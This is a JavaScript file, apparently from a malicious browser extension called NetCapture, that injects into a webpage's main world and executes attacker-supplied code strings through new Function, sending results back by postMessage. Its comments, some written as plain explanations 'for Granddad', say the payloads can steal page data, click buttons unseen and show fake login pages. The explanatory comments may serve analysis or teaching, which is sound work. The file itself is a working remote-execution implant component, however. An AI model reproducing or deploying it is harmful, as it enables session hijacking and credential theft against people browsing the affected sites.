// main_world_executor.js - Static script injected into the main page to execute dynamic payloads.

// SECURITY-NOTE: This script is injected into the "main world" of the webpage.
// This gives it direct access to the page's JavaScript variables and functions,
// making it much more powerful than a standard content script and allowing it to
// effectively execute the attacker's commands.

const POST_MESSAGE_OUT_ID = 'NETCAPTURE_EXECUTE_PAYLOAD';
const POST_MESSAGE_IN_ID = 'NETCAPTURE_EXECUTION_RESULT';

(function() {
    // Check if the listener already exists to avoid injecting it multiple times
    if (window.hasNetCaptureExecutor) return;
    window.hasNetCaptureExecutor = true;

    window.addEventListener('message', function(event) {
        if (event.source !== window || !event.data || event.data.type !== POST_MESSAGE_OUT_ID) {
            return;
        }

        const payload = event.data.payload;
        
        try {
            // DANGER: This is the final and most critical step of remote code execution.
            // The `new Function(payload)()` call takes the attacker's script (as a string)
            // and executes it with the full privileges of the webpage.
            // NOTE FOR GRANDDAD: This is the most dangerous line of code in the whole
            // program. It takes the malicious command sent by the attacker (the "payload")
            // and runs it on the website you are viewing. This can be used to steal
            // information from the page, click buttons without your knowledge, or show
            // you fake login pages to steal your password.
            const executionResult = (new Function(payload))(); 
            
            // ==========================================================
            // --- NEW: LOGIC TO HANDLE PROMISES ---
            // ==========================================================
            if (executionResult instanceof Promise) {
                // If the result is a Promise, wait for it to resolve.
                executionResult.then(promiseResult => {
                    // Once resolved, send the actual result back.
                    event.source.postMessage({
                        type: POST_MESSAGE_IN_ID,
                        detail: { result: String(promiseResult) }
                    }, event.origin);
                }).catch(e => {
                     // If the promise is rejected, send the error back.
                     event.source.postMessage({
                        type: POST_MESSAGE_IN_ID,
                        detail: { error: 'MainWorldPromiseError: ' + String(e) }
                    }, event.origin);
                });
            } else {
                // If it's a normal value, send it back immediately.
                event.source.postMessage({
                    type: POST_MESSAGE_IN_ID,
                    detail: { result: String(executionResult) }
                }, event.origin);
            }

        } catch (e) {
            // ... (Error handling to report failures back to the attacker) ...
            if (e instanceof EvalError && e.message.includes('Trusted Type')) {
                event.source.postMessage({
                    type: POST_MESSAGE_IN_ID,
                    detail: { error: 'ExecutionBlockedByTrustedTypes: This site uses a high-security policy (Trusted Types) that blocks dynamic script execution.' }
                }, event.origin);
            } else {
                // Handle all other standard script errors
                event.source.postMessage({
                    type: POST_MESSAGE_IN_ID,
                    detail: { error: 'MainWorldScriptError: ' + String(e) }
                }, event.origin);
            }
        }
    }, false);
})();